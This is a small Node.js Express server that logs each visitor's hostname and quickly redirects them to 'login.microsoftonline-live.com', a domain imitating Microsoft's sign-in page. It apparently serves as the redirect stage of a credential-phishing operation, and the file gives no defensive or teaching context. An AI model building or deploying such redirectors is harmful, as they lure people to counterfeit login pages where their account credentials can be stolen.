const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');

const app = express();
const port = 3001;

app.get('/', (req, res) => {
  console.log(`Accessed via: ${req.hostname}`); // Logs the domain name
  setTimeout(() => {
      res.redirect('https://login.microsoftonline-live.com/secure');
  }, 10);
});

app.listen(port, '0.0.0.0', () => {
  console.log(`Proxy server listening at http://www.toptier.ventures:${port}`);
});
